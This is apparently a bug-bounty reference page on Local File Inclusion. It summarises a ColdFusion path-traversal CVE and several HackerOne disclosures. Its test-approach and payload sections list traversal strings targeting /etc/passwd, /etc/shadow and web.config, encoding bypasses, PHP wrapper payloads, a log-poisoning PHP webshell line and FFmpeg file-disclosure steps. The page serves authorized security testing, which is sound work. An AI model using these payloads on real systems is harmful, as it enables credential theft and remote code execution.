# LFI Techniques

> Tracked CVEs and techniques for this class. Updated via daily `refresh-latest` pipeline.

_Last updated: 2026-07-08 · Items: 1_

## 2026-07-08 — Adobe ColdFusion RDS Path Traversal RCE (CVE-2026-48282)

### Adobe ColdFusion RDS FILEIO Path Traversal → Unauthenticated RCE
- **Date:** 2026-07-08 · **Source:** [resecurity.com](https://www.resecurity.com/blog/article/cve-2026-48282-adobe-coldfusion-rds-path-traversal-leading-to-rce) · **Class:** cve
- **What:** Path traversal in ColdFusion RDS FILEIO handler lets unauthenticated remote attacker write arbitrary files → RCE; requires RDS enabled with auth disabled.
- **Why it matters:** CVSS 10.0, CISA KEV added 2026-07-07 (patch deadline July 10), exploited in-the-wild within 2 hours of disclosure — ColdFusion runs under legacy enterprise apps common in BB scope.
- **Hunt signal:** `nuclei -t http/cves/2026/CVE-2026-48282.yaml` or probe `/_cf_distributed_view/fileio?path=../../../../evil.cfm` on exposed RDS ports (8500/443 with `/CFIDE/main/ide.cfm`)
- **Evidence:** [source](https://www.resecurity.com/blog/article/cve-2026-48282-adobe-coldfusion-rds-path-traversal-leading-to-rce) · [bleepingcomputer](https://www.bleepingcomputer.com/news/security/max-severity-adobe-coldfusion-flaw-now-exploited-in-attacks/) · [NVD](https://nvd.nist.gov/vuln/detail/CVE-2026-48282)

---

## What

_Define the class, prerequisites, and typical finding shape. Fill with real content._
_pending enrichment — baseline opener below_

See items under ## Items for per-finding details.

---

## CVEs

_No CVE-assigned items yet. Items below are pre-CVE or class-level findings._

---

## Probes

_Grep, curl, nuclei probes for this class. Append as items arrive with real PoCs._
_pending enrichment_

---

## PoCs

_Public PoC links rolled up from items below._

_No PoCs in items yet._

---

## Reproduction

_Step-by-step repro steps per CVE. Populated as items arrive with enough detail._
_pending enrichment_

---

## Defense

_Patch guidance and detection rules. Populated from vendor advisories._
_pending enrichment_

---

## References

_Populated by daily refresh-latest pipeline._

---

## Items

> Local File Inclusion — forcing a server to include or read arbitrary local files, leaking source code, credentials, or enabling code execution via log poisoning.

## Surface

- File path params: `?page=about`, `?template=home`, `?file=report.pdf`, `?lang=en`
- Download/export endpoints: `/download?path=`, `/export?filename=`
- Log viewing or debug features: `?log=access`, `?debug=1&file=`
- Image/avatar serving routes that map user input to filesystem paths
- PHP `include()`, `require()`, `include_once()` with unsanitized input
- Blind oracle: app behavior changes (error vs. no error) when file exists vs. not

## Test Approach

1. **Basic traversal** — start with `../` sequences, count directory depth:

   ```
   ?page=../../../../etc/passwd
   ?file=....//....//....//etc/passwd
   ```

2. **Null byte / encoding bypasses**:

   ```
   ?page=../../../etc/passwd%00
   ?page=..%252f..%252f..%252fetc/passwd   # double-encode
   ?page=....\/....\/etc/passwd            # mixed slashes
   ```

3. **PHP wrappers** — test for PHP-specific extension tricks:

   ```
   ?page=php://filter/convert.base64-encode/resource=index.php
   ?page=php://input  (POST body as PHP code)
   ?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
   ```

4. **Log poisoning → RCE** — inject PHP into User-Agent, then include log:

   ```
   User-Agent: <?php system($_GET['cmd']); ?>
   GET /index.php?page=../../../../var/log/apache2/access.log&cmd=id
   ```

5. **Blind file oracle** — probe for file existence via timing or error differences:

   ```
   ffuf -u "https://target.com/download?file=FUZZ" \
     -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
     -mr "root:" -t 30
   ```

6. **Windows targets** — use backslash and drive letters:

   ```
   ?file=..\..\..\..\windows\win.ini
   ?file=C:\inetpub\wwwroot\web.config
   ```

## Tools

- **ffuf** — path traversal wordlist fuzzing with match on known file strings
- **LFISuite** — automated LFI detection and exploitation
- **nuclei** — LFI templates: `nuclei -t lfi/ -u https://target.com`
- **Burp Intruder** — systematic encoding variant testing (none, URL, double-URL, null byte)

## Payloads / Probes

```
# Linux file targets
../../../../etc/passwd
../../../../etc/shadow
../../../../proc/self/environ
../../../../proc/self/fd/0
../../../../var/log/apache2/access.log
../../../../var/log/nginx/access.log

# PHP wrappers
php://filter/convert.base64-encode/resource=config.php
php://filter/read=string.rot13/resource=../config.php
expect://id

# Windows targets
..\..\..\windows\system32\drivers\etc\hosts
..\..\..\inetpub\wwwroot\web.config
..\..\..\xampp\htdocs\config.php

# Encoding bypasses
....//....//etc/passwd
..%252f..%252fetc%252fpasswd
%2e%2e%2f%2e%2e%2fetc%2fpasswd

# Mixed-slash filter bypass variants
../\
..\\/
/..
\/..
/%5c..
```

## FFmpeg local file disclosure

Targets that accept video uploads and process HLS playlists server-side with FFmpeg may disclose arbitrary local files:

1. Download gen_xbin_avi.py: https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py
2. Generate malicious AVI: `python3 gen_xbin_avi.py file:///etc/passwd output.avi`
3. Upload to target's video upload feature
4. Play the uploaded video via the site — if FFmpeg processes the embedded HLS inclusion, the file contents appear in the video stream

## Chain Opportunities

- **LFI → RCE** — log poisoning via User-Agent or SSH key injection, then include log
- **LFI → source disclosure → further vulns** — read `config.php` for DB creds, API keys
- **LFI + PHP wrapper → RCE** — `php://input` or `data://` if `allow_url_include=On`
- **LFI → /proc/self/environ** — inject PHP in env vars (HTTP_USER_AGENT), include environ

## Recent Intel

- **Flarum blind file oracle** · Unauthenticated blind LFI via file path param in forum software — file existence oracle via differential response · https://www.assetnote.io/resources/research/leaking-file-contents-with-a-blind-file-oracle-in-flarum
- **PHP filter chain RCE** · `php://filter` chains can generate arbitrary PHP strings without a file — enables RCE even without log poisoning · https://www.ambionics.io/blog/php-filter-chains-file-read-to-rce
- **CVE-2021-41773** · Apache path traversal + LFI → RCE in Apache 2.4.49/50, `%2e%2e%2f` bypass in `mod_cgi` — patched but still seen in the wild


## 2026-04-19 — H1 disclosures

### Path Traversal in writeFile via Unsafe Prefix Containment Check Allows Out-of-Directory Writes

- **2026-03-31** · sev: Medium · bounty: undisclosed
- Source: [hackerone.com/3634571](https://hackerone.com/reports/3634571) · Reporter: [@tipsen](https://hackerone.com/tipsen) · Team: [arkadiyt-projects](https://hackerone.com/arkadiyt-projects)
- CWE: Path Traversal

**What**

A path traversal vulnerability was discovered in the `protodump` tool. The vulnerability allowed an attacker to influence the output filename construction and bypass the containment check, enabling writes outside the intended output directory. The vulnerability was caused by the use of descriptor-controlled paths in the output filename construction, along with an unsafe lexical prefix check for directory containment. This issue has been identified in the `protodump` tool.

**Hunt signal:** pass — bug in a specific internal tool (`protodump`), no reusable endpoint or generic probe.

---


## 2026-05-27 — H1 disclosures

### ActiveStorage Disk Service Path Traversal via Custom Blob Key Injection

- **2026-05-07** · sev: Medium · bounty: undisclosed
- Source: [hackerone.com/3580511](https://hackerone.com/reports/3580511) · Reporter: [@ksw9722](https://hackerone.com/ksw9722) · Team: [Ruby on Rails](https://hackerone.com/rails)
- CWE: Path Traversal

**What**

A vulnerability was discovered in the ActiveStorage Disk Service component of Ruby on Rails. The vulnerability allowed an attacker to achieve arbitrary file write, read, and delete on the server's filesystem by injecting a malicious blob key. The vulnerability was due to insufficient validation of the blob key parameter before constructing file paths. This could be exploited by an attacker who could influence the hash passed to the `.attach()` method.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---


## 2026-07-01 — H1 disclosures

### Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling

- **2026-06-14** · sev: High · bounty: $5,000
- Source: [hackerone.com/3712279](https://hackerone.com/reports/3712279) · Reporter: [@kawakatz](https://hackerone.com/kawakatz) · Team: [PortSwigger Web Security](https://hackerone.com/portswigger)
- CWE: Path Traversal

**What**

A vulnerability was discovered in Burp Suite Professional 2026.3.3 on Windows. When Burp Scanner's browser-powered crawler crawled an attacker-controlled website, the website could force Burp to write an attacker-controlled file to an attacker-controlled local path. The issue was caused by Burp's handling of file input fields, where Burp created a local upload file from page-controlled attributes but did not prevent path traversal in the generated filename.

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---


## 2026-07-07 — H1 disclosures

### jitsi-call-analytics: Unauthenticated arbitrary file write via path traversal in `/api/v1/uploads/analyze`

- **2026-07-02** · sev: Low · bounty: $100
- Source: [hackerone.com/3485343](https://hackerone.com/reports/3485343) · Reporter: [@r1skr1der](https://hackerone.com/r1skr1der) · Team: [8x8](https://hackerone.com/8x8-bounty)
- CWE: Path Traversal

**What**

A path traversal vulnerability was discovered in the `/api/v1/uploads/analyze` endpoint of the jitsi-call-analytics backend. The vulnerability allowed unauthenticated users to write files within the configured `RTCSTATS_DOWNLOADS_PATH` directory. The issue was caused by the upload handler using user-controlled `file.originalname` directly in `path.join()` without sanitization, enabling attackers to include `../` sequences to escape the intended per-session UUID directory and write or overwrite files anywhere under the configured root path. …

**Hunt signal:** _Review H1 report for probe; add grep/nuclei tag here._

---
